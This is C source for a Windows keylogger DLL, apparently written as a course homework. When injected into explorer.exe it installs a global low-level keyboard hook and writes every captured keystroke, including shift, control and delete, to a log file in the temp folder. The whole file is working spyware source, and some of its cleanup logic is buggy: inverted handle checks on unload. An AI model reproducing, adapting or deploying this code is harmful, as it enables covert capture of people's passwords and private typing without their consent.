#include "../BGM532_HW2/Header.h"
#define EXPORTING_DLL
#include "kloc.h"

LRESULT CALLBACK LowLevelKeyboardProc(
	_In_  int nCode,
	      _In_  WPARAM wParam,
	      _In_  LPARAM lParam
);

#define BUFMAXSIZE 75
#define TARGETPROC "explorer.exe"

BYTE gbBuffer[BUFMAXSIZE];
DWORD gdwBufSize = 0;
HANDLE ghTheThread = NULL;
HANDLE ghAnaThread = NULL;
HANDLE g_hFile = NULL;

PCHAR szProcessName = NULL;
HHOOK ghhkLowLevelKybd = NULL;

void WriteToFile(PBYTE pbBuffer);
void DoTheJob(HINSTANCE hInstance);

void MessageLoop() {
	MSG msg;
	BOOL bRet;

	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
		if (bRet == -1) {
			// handle the error and possibly exit
			break;
		} else {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
}

void DoTheJob(HINSTANCE hInstance) {

	CHAR szTempPath[MAX_PATH], szTempFileName[MAX_PATH];

	if (!GetTempPathA(MAX_PATH, szTempPath)) {
		HATA(L"WriteToFile", L"GetTempPathA");
		return;
	}

	sprintf_s(szTempFileName, "%s\\%s", szTempPath, KEYLOGFILE);

	g_hFile = CreateFileA(szTempFileName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (g_hFile == INVALID_HANDLE_VALUE) {
		HATA(L"WriteToFile", L"CreateFile");
		return;
	}
	//set my hook
	ghhkLowLevelKybd = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);

	MessageLoop();
}

void WriteToFile(PBYTE pbBuffer) {
	DWORD lpNumOfBWritten = 0;
	if (!WriteFile(g_hFile, pbBuffer, BUFMAXSIZE, &lpNumOfBWritten, NULL)) {
		HATA(L"WriteToFile", L"WriteFile");
		goto temizle;
	}

temizle:
	free(pbBuffer);
}

LRESULT CALLBACK LowLevelKeyboardProc(_In_  int nCode, _In_  WPARAM wParam, _In_  LPARAM lParam) {

	CHAR cKey = 0;
	// If key is being pressed
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
		switch (p->vkCode) {
				// Invisible keys
			case VK_CAPITAL: cKey = 1;
				break;
			case VK_SHIFT: cKey = 2;
				break;
			case VK_LCONTROL: cKey = 3;
				break;
			case VK_RCONTROL: cKey = 4;
				break;
			case VK_INSERT: cKey = 5;
				break;
			case VK_END: cKey = 6;
				break;
			case VK_PRINT: cKey = 7;
				break;
			case VK_DELETE: cKey = 8;
				break;
			case VK_BACK: cKey = 9;
				break;
			case VK_LEFT: cKey = 10;
				break;
			case VK_RIGHT: cKey = 11;
				break;
			case VK_UP: cKey = 12;
				break;
			case VK_DOWN: cKey = 12;
				break;
				// Visible keys
			default:
				cKey = char(tolower(p->vkCode));
				
		}
		gbBuffer[gdwBufSize++] = cKey;

		if (gdwBufSize == BUFMAXSIZE) {
			PBYTE pTempBuff = (PBYTE)malloc(BUFMAXSIZE);
			memcpy_s(pTempBuff, BUFMAXSIZE, gbBuffer, BUFMAXSIZE);
			ghTheThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WriteToFile, pTempBuff, NULL, NULL);
			if (!ghTheThread) {
				HATA(L"Injected Process", L"LowLevelKeyboardProc CreateThread");
			}

			gdwBufSize = 0;
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK CBTProc(_In_  int nCode, _In_ WPARAM wParam, _In_  LPARAM lParam) {
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD fdwReason, LPVOID lpReserved) {
	//hangi prosesteyiz ? ismi nedir?		
	CHAR lpFilename[MAX_PATH];
	GetModuleFileNameA(NULL, lpFilename, MAX_PATH);
	szProcessName = strrchr(lpFilename, '\\') + 1;
	int i = -1;
	while (szProcessName[i++]) szProcessName[i] = tolower(szProcessName[i]);

	if (fdwReason == DLL_PROCESS_ATTACH) {
		//HANDLE hThread = NULL;

		if (!strncmp(szProcessName, TARGETPROC, strlen(TARGETPROC))) {
#ifdef _DEBUG_OLD
			MessageBoxA(NULL,				
				"Kloc.dll DllMain(DLL_PROCESS_ATTACH, ...)",
				szProcessName,
				MB_OK);
#endif

			//thread i çalistir
			ghAnaThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DoTheJob, hModule, NULL, NULL);
			if (!ghAnaThread) {
				HATAA(szProcessName, "DllMain(DLL_PROCESS_ATTACH) CreateThread");
				//goto temizle;
			}

			//çalisma olduguna göre unhook edebilirsin...
			HANDLE hEvent = OpenEventA(EVENT_ALL_ACCESS, 0, EVENTNAME);
			if (hEvent == NULL) {
				HATAA(szProcessName, "DllMain(DLL_PROCESS_ATTACH) OpenEventA");
				return TRUE;
			}

			SetEvent(hEvent);
		}
	}

	if (fdwReason == DLL_PROCESS_DETACH) {
		if (!strncmp(szProcessName, TARGETPROC, strlen(TARGETPROC))) {
			if (!ghhkLowLevelKybd)
				UnhookWindowsHookEx(ghhkLowLevelKybd);
			if (!ghTheThread)
				WaitForSingleObject(ghTheThread, INFINITE);
			if (g_hFile)
				CloseHandle(g_hFile);
		}
	}

	return TRUE;
}
